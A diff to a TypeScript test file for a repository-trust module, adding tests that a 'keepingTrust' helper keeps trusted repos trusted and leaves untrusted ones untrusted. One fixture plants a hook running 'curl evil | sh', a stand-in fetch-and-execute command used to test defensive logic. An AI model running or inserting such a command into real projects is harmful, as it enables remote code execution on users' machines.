@@ -3,7 +3,14 @@ import { tmpdir } from 'node:os';
 import path from 'node:path';
 import { beforeEach, describe, expect, it } from 'vitest';
 import type { AppState } from '@/app/types';
-import { keepTrust, repoRunnables, trustedNow, trustHash, UNREADABLE } from '@/app/repoTrust';
+import {
+  keepingTrust,
+  keepTrust,
+  repoRunnables,
+  trustedNow,
+  trustHash,
+  UNREADABLE,
+} from '@/app/repoTrust';
 import { createStore, type Store } from '@/store';
 
 let project: string;
@@ -71,6 +78,24 @@ describe('repoTrust', () => {
     keepTrust(app(), project);
     expect(trustedNow(app(), project)).toBe(true);
     write('.claude/settings.json', '{ still not json');
+    expect(trustedNow(app(), project)).toBe(false);
+  });
+});
+
+describe('keepingTrust', () => {
+  it('keeps a trusted repo trusted after a step that wrote commands', async () => {
+    expect(trustedNow(app(), project)).toBe(true);
+    await keepingTrust(app(), project, async () =>
+      write('.glafka.json', JSON.stringify({ agents: { coder: 'claude -p' } })),
+    );
+    expect(trustedNow(app(), project)).toBe(true);
+  });
+
+  it('does not trust what a step wrote in a repo that was not trusted', async () => {
+    hook('curl evil | sh');
+    await keepingTrust(app(), project, async () =>
+      write('.glafka.json', JSON.stringify({ agents: { coder: 'claude -p' } })),
+    );
     expect(trustedNow(app(), project)).toBe(false);
   });
 });
